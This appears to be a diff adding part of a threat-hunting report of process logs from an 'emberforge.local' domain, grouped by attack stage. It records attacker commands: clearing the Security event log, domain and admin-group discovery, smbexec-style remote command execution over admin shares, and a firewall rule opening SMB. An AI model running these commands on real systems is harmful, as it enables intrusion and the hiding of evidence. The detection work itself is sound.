+  {'UtcTime_s': '2026-01-30 23:52:00.344', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': '"C:\\Windows\\System32\\..\\System32\\cmd" /F:ON /c wevtutil cl Security &gt; \\Windows\\Temp\\/BCkIniFg 2&gt;&amp;1'}
+
+[DISCOVERY] — 13 events
+  {'UtcTime_s': '2026-01-30 21:34:19.311', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'CommandLine_s': 'ipconfig /all', 'ParentImage_s': 'C:\\Windows\\System32\\rundll32.exe'}
+  {'UtcTime_s': '2026-01-30 21:34:32.951', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'CommandLine_s': 'net user /domain', 'ParentImage_s': 'C:\\Windows\\System32\\rundll32.exe'}
+  {'UtcTime_s': '2026-01-30 21:34:44.359', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'CommandLine_s': 'net group "Domain Admins" /domain', 'ParentImage_s': 'C:\\Windows\\System32\\rundll32.exe'}
+  {'UtcTime_s': '2026-01-30 21:35:07.115', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'CommandLine_s': 'nltest /dclist:emberforge.local', 'ParentImage_s': 'C:\\Windows\\System32\\rundll32.exe'}
+  {'UtcTime_s': '2026-01-30 21:41:43.162', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'CommandLine_s': 'whoami /priv', 'ParentImage_s': 'C:\\Users\\Public\\update.exe'}
+
+[LATERAL_MOVEMENT] — 28 events
+  {'UtcTime_s': '2026-01-30 22:07:46.523', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'C:\\Windows\\system32\\cmd.exe /Q /c echo cd  ^&gt; \\\\EC2AMAZ-16V3AU4\\C$\\__output_QoCDsxXQ 2^&gt;^&amp;1 &gt; C:\\Windows\\CFqXRazo.bat &amp; C:\\Windows\\system32\\cmd.exe /Q /c C:\\Windows\\CFqXRazo.bat &amp;', 'ParentImage_s': 'C:\\Windows\\System32\\services.exe'}
+  {'UtcTime_s': '2026-01-30 22:08:18.775', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'C:\\Windows\\system32\\cmd.exe /Q /c echo whoami ^&gt; \\\\EC2AMAZ-16V3AU4\\C$\\__output_QoCDsxXQ 2^&gt;^&amp;1 &gt; C:\\Windows\\pPrBLvAi.bat &amp; C:\\Windows\\system32\\cmd.exe /Q /c C:\\Windows\\pPrBLvAi.bat &a', 'ParentImage_s': 'C:\\Windows\\System32\\services.exe'}
+  {'UtcTime_s': '2026-01-30 22:08:32.765', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'C:\\Windows\\system32\\cmd.exe /Q /c echo hostname ^&gt; \\\\EC2AMAZ-16V3AU4\\C$\\__output_QoCDsxXQ 2^&gt;^&amp;1 &gt; C:\\Windows\\AehANyQU.bat &amp; C:\\Windows\\system32\\cmd.exe /Q /c C:\\Windows\\AehANyQU.bat ', 'ParentImage_s': 'C:\\Windows\\System32\\services.exe'}
+  {'UtcTime_s': '2026-01-30 22:08:45.772', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'C:\\Windows\\system32\\cmd.exe /Q /c echo dir C:\\ ^&gt; \\\\EC2AMAZ-16V3AU4\\C$\\__output_QoCDsxXQ 2^&gt;^&amp;1 &gt; C:\\Windows\\OuOysXTx.bat &amp; C:\\Windows\\system32\\cmd.exe /Q /c C:\\Windows\\OuOysXTx.bat &', 'ParentImage_s': 'C:\\Windows\\System32\\services.exe'}
+  {'UtcTime_s': '2026-01-30 22:10:07.719', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'C:\\Windows\\system32\\cmd.exe /Q /c echo cd  ^&gt; \\\\EC2AMAZ-16V3AU4\\C$\\__output_QoCDsxXQ 2^&gt;^&amp;1 &gt; C:\\Windows\\FqdsqNZt.bat &amp; C:\\Windows\\system32\\cmd.exe /Q /c C:\\Windows\\FqdsqNZt.bat &amp;', 'ParentImage_s': 'C:\\Windows\\System32\\services.exe'}
+
+[INITIAL_ACCESS] — 20 events
+  {'UtcTime_s': '2026-01-30 21:20:28.092', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'Image_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe', 'CommandLine_s': '"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"', 'ParentImage_s': 'C:\\Windows\\explorer.exe'}
+  {'UtcTime_s': '2026-01-30 21:20:28.304', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'Image_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe', 'CommandLine_s': '"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=crashpad-handler "--user-data-dir=C:\\Users\\lmartin.EMBERFORGE\\AppData\\Local\\Microsoft\\Edge\\User Data" /prefetch:4 --monitor-self-a', 'ParentImage_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'}
+  {'UtcTime_s': '2026-01-30 21:20:28.384', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'Image_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe', 'CommandLine_s': '"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --startup-read-main-dll --metrics', 'ParentImage_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'}
+  {'UtcTime_s': '2026-01-30 21:20:28.387', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'Image_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe', 'CommandLine_s': '"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=gpu-process --gpu-preferences=SAAAAAAAAADgAAAEAAAAAAAAAAAAAGAAAQAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAACAAA', 'ParentImage_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'}
+  {'UtcTime_s': '2026-01-30 21:20:28.415', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'Image_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe', 'CommandLine_s': '"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-US --service-sandbox-type=service --startup-read-main-dll --metr', 'ParentImage_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'}
+
+[RENAMED] — 51 events
+  {'UtcTime_s': '2026-01-30 21:17:44.920', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'Image_s': 'C:\\Windows\\System32\\TSTheme.exe', 'OriginalFileName_s': 'TSThemeS.exe', 'CommandLine_s': 'C:\\Windows\\system32\\TSTheme.exe -Embedding', 'SHA256_s': 'C31798A1BD47ABD1D3EA6344F535BDDEB2C1AB5FEAD49CCF5CFC3F1C7FB35C17'}
+  {'UtcTime_s': '2026-01-30 21:17:46.687', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'EMBERFORGE\\jsmith', 'Image_s': 'C:\\Windows\\System32\\TSTheme.exe', 'OriginalFileName_s': 'TSThemeS.exe', 'CommandLine_s': 'C:\\Windows\\system32\\TSTheme.exe -Embedding', 'SHA256_s': 'C31798A1BD47ABD1D3EA6344F535BDDEB2C1AB5FEAD49CCF5CFC3F1C7FB35C17'}
+  {'UtcTime_s': '2026-01-30 21:17:49.139', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'User_s': 'EMBERFORGE\\Administrator', 'Image_s': 'C:\\Windows\\System32\\TSTheme.exe', 'OriginalFileName_s': 'TSThemeS.exe', 'CommandLine_s': 'C:\\Windows\\system32\\TSTheme.exe -Embedding', 'SHA256_s': 'C31798A1BD47ABD1D3EA6344F535BDDEB2C1AB5FEAD49CCF5CFC3F1C7FB35C17'}
+  {'UtcTime_s': '2026-01-30 21:18:10.488', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'Image_s': 'C:\\Windows\\System32\\TSTheme.exe', 'OriginalFileName_s': 'TSThemeS.exe', 'CommandLine_s': 'C:\\Windows\\system32\\TSTheme.exe -Embedding', 'SHA256_s': 'C31798A1BD47ABD1D3EA6344F535BDDEB2C1AB5FEAD49CCF5CFC3F1C7FB35C17'}
+  {'UtcTime_s': '2026-01-30 21:18:22.912', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'EMBERFORGE\\jsmith', 'Image_s': 'C:\\Windows\\System32\\TSTheme.exe', 'OriginalFileName_s': 'TSThemeS.exe', 'CommandLine_s': 'C:\\Windows\\system32\\TSTheme.exe -Embedding', 'SHA256_s': 'C31798A1BD47ABD1D3EA6344F535BDDEB2C1AB5FEAD49CCF5CFC3F1C7FB35C17'}
+
+[FIREWALL] — 2 events
+  {'UtcTime_s': '2026-01-30 22:54:09.901', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'cmd.exe /c "netsh advfirewall firewall add rule name=\\"SMB\\" dir=in action=allow protocol=tcp localport=445"'}
+  {'UtcTime_s': '2026-01-30 22:54:09.948', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'netsh  advfirewall firewall add rule name=\\"SMB\\" dir=in action=allow protocol=tcp localport=445'}
+
+============================================================
+End of report.
+============================================================
